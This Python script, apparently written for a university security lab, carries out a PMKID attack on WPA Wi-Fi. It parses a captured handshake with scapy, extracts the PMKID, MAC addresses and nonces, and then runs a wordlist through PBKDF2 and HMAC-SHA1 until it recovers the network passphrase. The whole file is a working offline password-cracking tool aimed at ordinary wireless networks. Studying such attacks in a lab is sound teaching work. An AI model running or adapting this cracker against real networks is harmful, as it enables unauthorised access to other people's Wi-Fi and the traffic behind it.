#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""

PMKID attaque

"""

__author__      = "Abraham Rubinstein et Yann Lederrey"
__copyright__   = "Copyright 2017, HEIG-VD"
__license__ 	= "GPL"
__version__ 	= "1.0"
__email__ 		= "abraham.rubinstein@heig-vd.ch"
__status__ 		= "Prototype"

# Modified by Nathanaël Mizutani, Stefan Dejanovic
# Date: 27.04.2020
# Source: https://scapy.readthedocs.io/en/latest/api/scapy.layers.dot11.html

from scapy.all import *
from binascii import a2b_hex, b2a_hex
from pbkdf2 import *
from numpy import array_split
from numpy import array
import hmac, hashlib

def customPRF512(key,A,B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i    = 0
    R    = b''
    while i<=((blen*8+159)/160):
        hmacsha1 = hmac.new(key,A+str.encode(chr(0x00))+B+str.encode(chr(i)),hashlib.sha1)
        i+=1
        R = R+hmacsha1.digest()
    return R[:blen]

# Read capture file -- it contains beacon, authentication, association, handshake and data
wpa = rdpcap("PMKID_handshake.pcap")
# Array to store the handshake packets
handshake = []

for p in wpa:
    if(p.haslayer(EAPOL)): # We check if the packet is part of the 4-way handshake
        handshake.append(p) # We retrieve the complete 4-way handshake

    # We use the association request packet to retrieve the ssid
    if(p.haslayer(Dot11AssoReq)): 
        ssid = p.info

# Define all elements
PMKID      = ""
Clientmac  = ""
APmac      = ""
ANonce     = ""
SNonce     = ""

# We retrieve the parameters from the handshake packets
for x in handshake:
    if x[Raw].load.hex()[:6] == '02008a':
        PMKID = x[Raw].load.hex()[-32:]
        Clientmac = a2b_hex((x[Dot11].addr1).replace(":",""))
        APmac = a2b_hex((x[Dot11].addr2).replace(":",""))
        ANonce = a2b_hex(x[Raw].load.hex()[26:90])
    if x[Raw].load.hex()[:6] == '02010a':
        SNonce = a2b_hex(x[Raw].load.hex()[26:90])
    if PMKID != "" and Clientmac != "" and APmac != "" and ANonce != "" and SNonce != "":
        break

A           = "Pairwise key expansion" #this string is used in the pseudo-random function

B           = min(APmac,Clientmac)+max(APmac,Clientmac)+min(ANonce,SNonce)+max(ANonce,SNonce) #used in pseudo-random function

data        = a2b_hex("0103005f02030a0000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000") #cf "Quelques détails importants" dans la donné

# Read the passphrase from the file wordlist
passPhrases = open("wordlist","r").read().split("\n")

for passPhrase in passPhrases :
    #calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
    passPhrase = str.encode(passPhrase)

    pmk = pbkdf2(hashlib.sha1,passPhrase, ssid, 4096, 32)

    # generate the pmkid with the Apmac, clientMac and pmk 
    pmkid_to_test = hmac.new(pmk,str.encode("PMK Name") + APmac + Clientmac,hashlib.sha1)
 
    # Check if the 2 PMKID are same
    if PMKID == pmkid_to_test.hexdigest()[0:len(PMKID)]:
        print("[*] The passphrase (" + str(passPhrase) + ") is correct")
        exit()

print("[*] The passphrases are not correct. Try with a different passphrase")


